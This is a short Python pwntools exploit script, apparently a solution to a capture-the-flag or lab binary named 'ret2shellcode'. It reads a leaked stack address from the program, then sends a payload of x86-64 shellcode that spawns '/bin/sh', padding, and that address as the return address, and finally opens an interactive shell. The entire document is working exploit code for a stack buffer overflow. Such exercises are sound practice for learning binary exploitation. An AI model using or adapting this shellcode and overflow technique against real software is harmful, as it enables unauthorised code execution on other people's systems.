#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./ret2shellcode')  

io = process()

io.recvuntil('here...  ')

return_address = int(io.recv(14),16)

shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

payload = shellcode + cyclic(16) + pack(return_address)

io.sendline(payload)

io.interactive()
